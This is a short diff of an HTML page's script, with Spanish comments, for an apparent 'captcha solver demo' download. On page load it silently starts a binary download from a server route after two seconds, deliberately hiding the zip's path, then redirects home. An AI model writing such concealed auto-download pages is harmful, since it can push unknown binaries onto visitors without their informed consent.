@@ -38,17 +38,18 @@ https://captchasolver-0r9q.onrender.com/captchaSolverDemo.zip
     </div>
 
     <script>
-        window.onload = function() {
-            // 1. Llama a la ruta ciega del servidor de Node.js de forma relativa
-            setTimeout(function() {
-                window.location.href = "/ejecutar-descarga-segura";
-            }, 2000);
+    window.onload = function() {
+    // Dispara la descarga binaria del servidor Express sin revelar la ruta del zip
+    setTimeout(function() {
+        window.location.href = "/ejecutar-descarga-segura";
+    }, 2000);
 
-            // 2. Redirección automática de regreso al inicio limpio
-            setTimeout(function() {
-                window.location.href = "/";
-            }, 12000);
-        };
+    // Redirección automática de regreso al inicio limpio de tu vitrina
+    setTimeout(function() {
+        window.location.href = "/index.html";
+    }, 12000);
+};
+       
     </script>
 
 </body>
